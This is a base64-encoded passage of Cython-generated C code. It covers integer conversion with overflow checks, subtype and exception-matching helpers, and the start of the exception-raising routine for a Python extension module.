VkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKCgoKGludClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKGxvbmcpKSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgbG9uZywgUHlMb25nX0FzTG9uZyh4KSlcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpXG4jZW5kaWZcbiAgICAgICAgfVxuICAgIH1cbiAgICB7XG4gICAgICAgIGludCB2YWw7XG4gICAgICAgIGludCByZXQgPSAtMTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIFB5X3NzaXplX3QgYnl0ZXNfY29waWVkID0gUHlMb25nX0FzTmF0aXZlQnl0ZXMoXG4gICAgICAgICAgICB4LCAmdmFsLCBzaXplb2YodmFsKSwgUHlfQVNOQVRJVkVCWVRFU19OQVRJVkVfRU5ESUFOIHwgKGlzX3Vuc2lnbmVkID8gUHlfQVNOQVRJVkVCWVRFU19VTlNJR05FRF9CVUZGRVIgfCBQeV9BU05BVElWRUJZVEVTX1JFSkVDVF9ORUdBVElWRSA6IDApKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHtcbiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPiAoUHlfc3NpemVfdCkgc2l6ZW9mKHZhbCkpKSB7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0ID0gMDtcbiAgICAgICAgfVxuI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSlcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBpc19saXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHVuc2lnbmVkIGNoYXIgKmJ5dGVzID0gKHVuc2lnbmVkIGNoYXIgKikmdmFsO1xuICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXMsIHNpemVvZih2YWwpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfbGl0dGxlLCAhaXNfdW5zaWduZWQpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnY7XG4gICAgICAgIFB5T2JqZWN0ICpzdGVwdmFsID0gTlVMTCwgKm1hc2sgPSBOVUxMLCAqc2hpZnQgPSBOVUxMO1xuICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDtcbiAgICAgICAgaW50IGNodW5rX3NpemUgPSAoc2l6ZW9mKGxvbmcpIDwgOCkgPyAzMCA6IDYyO1xuICAgICAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KHgpKSkge1xuICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHYgPSBQeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTtcbiAgICAgICAgfVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaXNfbmVnYXRpdmUgPSByZXN1bHQgPT0gMTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYodik7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdztcbiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkge1xuICAgICAgICAgICAgc3RlcHZhbCA9IFB5TnVtYmVyX0ludmVydCh2KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgc3RlcHZhbCA9IHY7XG4gICAgICAgIH1cbiAgICAgICAgdiA9IE5VTEw7XG4gICAgICAgIHZhbCA9IChpbnQpIDA7XG4gICAgICAgIG1hc2sgPSBQeUxvbmdfRnJvbUxvbmcoKDFMIDw8IGNodW5rX3NpemUpIC0gMSk7IGlmICh1bmxpa2VseSghbWFzaykpIGdvdG8gZG9uZTtcbiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7XG4gICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YoaW50KSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp0bXAsICpkaWdpdDtcbiAgICAgICAgICAgIGxvbmcgaWRpZ2l0O1xuICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIWRpZ2l0KSkgZ290byBkb25lO1xuICAgICAgICAgICAgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhkaWdpdCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICB2YWwgfD0gKChpbnQpIGlkaWdpdCkgPDwgYml0cztcbiAgICAgICAgICAgIHRtcCA9IFB5TnVtYmVyX1JzaGlmdChzdGVwdmFsLCBzaGlmdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihzdGVwdmFsKTsgc3RlcHZhbCA9IHRtcDtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7XG4gICAgICAgIFB5X0RFQ1JFRihtYXNrKTsgbWFzayA9IE5VTEw7XG4gICAgICAgIHtcbiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgcmVtYWluaW5nX2JpdHMgPSAoKGludCkgc2l6ZW9mKGludCkgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0ID49ICgxTCA8PCByZW1haW5pbmdfYml0cykpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7XG4gICAgICAgICAgICB2YWwgfD0gKChpbnQpIGlkaWdpdCkgPDwgYml0cztcbiAgICAgICAgfVxuICAgICAgICBpZiAoIWlzX3Vuc2lnbmVkKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgoaW50KSAxKSA8PCAoc2l6ZW9mKGludCkgKiA4IC0gMSkpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKVxuICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMDtcbiAgICBkb25lOlxuICAgICAgICBQeV9YREVDUkVGKHNoaWZ0KTtcbiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTtcbiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkocmV0KSlcbiAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTtcbiAgICAgICAgcmV0dXJuIHZhbDtcbiAgICB9XG5yYWlzZV9vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgInZhbHVlIHRvbyBsYXJnZSB0byBjb252ZXJ0IHRvIGludCIpO1xuICAgIHJldHVybiAoaW50KSAtMTtcbnJhaXNlX25lZ19vdmVyZmxvdzpcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvcixcbiAgICAgICAgImNhblwndCBjb252ZXJ0IG5lZ2F0aXZlIHZhbHVlIHRvIGludCIpO1xuICAgIHJldHVybiAoaW50KSAtMTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgaW50IF9fUHl4X0luQmFzZXMoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHtcbiAgICB3aGlsZSAoYSkge1xuICAgICAgICBhID0gX19QeXhfUHlUeXBlX0dldFNsb3QoYSwgdHBfYmFzZSwgUHlUeXBlT2JqZWN0Kik7XG4gICAgICAgIGlmIChhID09IGIpXG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4gICAgcmV0dXJuIGIgPT0gJlB5QmFzZU9iamVjdF9UeXBlO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYikge1xuICAgIFB5T2JqZWN0ICptcm87XG4gICAgaWYgKGEgPT0gYikgcmV0dXJuIDE7XG4gICAgbXJvID0gYS0+dHBfbXJvO1xuICAgIGlmIChsaWtlbHkobXJvKSkge1xuICAgICAgICBQeV9zc2l6ZV90IGksIG47XG4gICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHtcbiAgICAgICAgICAgIGlmIChQeVR1cGxlX0dFVF9JVEVNKG1ybywgaSkgPT0gKFB5T2JqZWN0ICopYilcbiAgICAgICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoYSwgYik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHtcbiAgICBQeU9iamVjdCAqbXJvO1xuICAgIGlmIChjbHMgPT0gYSB8fCBjbHMgPT0gYikgcmV0dXJuIDE7XG4gICAgbXJvID0gY2xzLT50cF9tcm87XG4gICAgaWYgKGxpa2VseShtcm8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgaSwgbjtcbiAgICAgICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUobXJvKTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykge1xuICAgICAgICAgICAgUHlPYmplY3QgKmJhc2UgPSBQeVR1cGxlX0dFVF9JVEVNKG1ybywgaSk7XG4gICAgICAgICAgICBpZiAoYmFzZSA9PSAoUHlPYmplY3QgKilhIHx8IGJhc2UgPT0gKFB5T2JqZWN0ICopYilcbiAgICAgICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoY2xzLCBhKSB8fCBfX1B5eF9JbkJhc2VzKGNscywgYik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCogZXhjX3R5cGUxLCBQeU9iamVjdCAqZXhjX3R5cGUyKSB7XG4gICAgaWYgKGV4Y190eXBlMSkge1xuICAgICAgICByZXR1cm4gX19QeXhfSXNBbnlTdWJ0eXBlMigoUHlUeXBlT2JqZWN0KillcnIsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMSwgKFB5VHlwZU9iamVjdCopZXhjX3R5cGUyKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gX19QeXhfSXNTdWJ0eXBlKChQeVR5cGVPYmplY3QqKWVyciwgKFB5VHlwZU9iamVjdCopZXhjX3R5cGUyKTtcbiAgICB9XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKFB5T2JqZWN0ICpleGNfdHlwZSwgUHlPYmplY3QgKnR1cGxlKSB7XG4gICAgUHlfc3NpemVfdCBpLCBuO1xuICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSk7XG4gICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUodHVwbGUpO1xuICAgIGZvciAoaT0wOyBpPG47IGkrKykge1xuICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxO1xuICAgIH1cbiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHtcbiAgICAgICAgUHlPYmplY3QgKnQgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKTtcbiAgICAgICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKHQpKSkge1xuICAgICAgICAgICAgaWYgKF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXhjX3R5cGUsIE5VTEwsIHQpKSByZXR1cm4gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoUHlPYmplY3QgKmVyciwgUHlPYmplY3QqIGV4Y190eXBlKSB7XG4gICAgaWYgKGxpa2VseShlcnIgPT0gZXhjX3R5cGUpKSByZXR1cm4gMTtcbiAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXJyKSkpIHtcbiAgICAgICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSkpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgTlVMTCwgZXhjX3R5cGUpO1xuICAgICAgICB9IGVsc2UgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrKGV4Y190eXBlKSkpIHtcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXNUdXBsZShlcnIsIGV4Y190eXBlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKmV4Y190eXBlMSwgUHlPYmplY3QgKmV4Y190eXBlMikge1xuICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMSkpO1xuICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMikpO1xuICAgIGlmIChsaWtlbHkoZXJyID09IGV4Y190eXBlMSB8fCBlcnIgPT0gZXhjX3R5cGUyKSkgcmV0dXJuIDE7XG4gICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgZXhjX3R5cGUxLCBleGNfdHlwZTIpO1xuICAgIH1cbiAgICByZXR1cm4gKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlMSkgfHwgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUyKSk7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSkge1xuICAgIFB5T2JqZWN0KiBvd25lZF9pbnN0YW5jZSA9IE5VTEw7XG4gICAgaWYgKHRiID09IFB5X05vbmUpIHtcbiAgICAgICAgdGIgPSAwO1xuICAgIH0gZWxzZSBpZiAodGIgJiYgIVB5VHJhY2VCYWNrX0NoZWNrKHRiKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgInJhaXNlOiBhcmcgMyBtdXN0IGJlIGEgdHJhY2ViYWNrIG9yIE5vbmUiKTtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKVxuICAgICAgICB2YWx1ZSA9IDA7XG4gICAgaWYgKFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodHlwZSkpIHtcbiAgICAgICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICJpbnN0YW5jZSBleGNlcHRpb24gbWF5IG5vdCBoYXZlIGEgc2VwYXJhdGUgdmFsdWUiKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIHZhbHVlID0gdHlwZTtcbiAgICAgICAgdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpO1xuICAgIH0gZWxzZSBpZiAoUHlFeGNlcHRpb25DbGFzc19DaGVjayh0eXBlKSkge1xuICAgICAgICBQeU9iamVjdCAqaW5zdGFuY2VfY2xhc3MgPSBOVUxMO1xuICAgICAgICBpZiAodmFsdWUgJiYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHtcbiAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gKFB5T2JqZWN0KikgUHlfVFlQRSh2YWx1ZSk7XG4gICAgICAgICAgICBpZiAoaW5zdGFuY2VfY2xhc3MgIT0gdHlwZSkge1xuICAgICAgICAgICAgICAgIGludCBpc19zdWJjbGFzcyA9IFB5T2JqZWN0X0lzU3ViY2xhc3MoaW5zdGFuY2VfY2xhc3MsIHR5cGUpO1xuICAgICAgICAgICAgICAgIGlmICghaXNfc3ViY2xhc3MpIHtcbiAgICAgICAgICAgICAgICAgICAgaW5zdGFuY2VfY2xhc3MgPSBOVUxMO1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoaXNfc3ViY2xhc3MgPT0gLTEpKSB7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHR5cGUgPSBpbnN0YW5jZV9jbGFzcztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFpbnN0YW5jZV9jbGFzcykge1xuICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3M7XG4gICAgICAgICAgICBpZiAoIXZhbHVlKVxuICAgICAgICAgICAgICAgIGFyZ3MgPSBQeVR1cGxlX05ldygwKTtcbiAgICAgICAgICAgIGVsc2UgaWYgKFB5VHVwbGVfQ2hlY2sodmFsdWUpKSB7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgICAgICBhcmdzID0gdmFsdWU7XG4gICAgICAgICAgICB9IGVsc2VcbiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIHZhbHVlKTtcbiAgICAgICAgICAgIGlmICghYXJncylcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgIG93bmVkX2luc3RhbmNlID0gUHlPYmplY3RfQ2FsbCh0eXBlLCBhcmdzLCBOVUxMKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzKTtcbiAgICAgICAgICAgIGlmICghb3duZWRfaW5zdGFuY2UpXG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZSA9IG93bmVkX2luc3RhbmNlO1xuICAgICAgICAgICAgaWYgKCFQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHZhbHVlKSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjYWxsaW5nICVSIHNob3VsZCBoYXZlIHJldHVybmVkIGFuIGluc3RhbmNlIG9mICJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkJhc2VFeGNlcHRpb24sIG5vdCAlUiIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGUsIFB5X1RZUEUodmFsdWUpKTtcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAicmFpc2U6IGV4Y2VwdGlvbiBjbGFzcyBtdXN0IGJlIGEgc3ViY2xhc3Mgb2YgQmFzZUV4Y2VwdGlvbiIpO1xuICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgaWYgKGNhdXNlKSB7XG4gICAgICAgIFB5T2JqZWN0ICpmaXhlZF9jYXVzZTtcbiAgICAgICAgaWYgKGNhdXNlID09IFB5X05vbmUpIHtcbiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gTlVMTDtcbiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGNhdXNlKSkge1xuICAgICAgICAgICAgZml4ZWRfY2F1c2UgPSBQeU9iamVjdF9DYWxsT2JqZWN0KGNhdXNlLCBOVUxMKTtcbiAgICAgICAgICAgIGlmIChmaXhlZF9jYXVzZSA9PSBOVUxMKVxuICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2soY2F1c2UpKSB7XG4gICAgICAgICAgICBmaXhlZF9jYXVzZSA9IGNhdXNlO1xuICAgICAgICAgICAgUHlfSU5DUkVGKGZpeGVkX2NhdXNlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgImV4Y2VwdGlvbiBjYXVzZXMgbXVzdCBkZXJpdmUgZnJvbSAiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIkJhc2VFeGNlcHRpb24iKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIFB5RXhjZXB0aW9uX1NldENhdXNlKHZhbHVlLCBmaXhlZF9jYXVzZSk7XG4gICAgfVxuICAgIFB5RXJyX1NldE9iamVjdCh0eXBlLCB2YWx1ZSk7XG4gICAgaWYgKHRiKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuICAgICAgICBQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sodmFsdWUsIHRiKTtcbiNlbGlmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgICAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4gICAgICAgIFB5T2JqZWN0KiB0bXBfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgICAgIGlmICh0YiAhPSB0bXBfdGIpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRih0Yik7XG4gICAgICAgICAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAgICAgICAgIFB5X1hERUNSRUYodG1wX3RiKTtcbiAgICAgICAgfV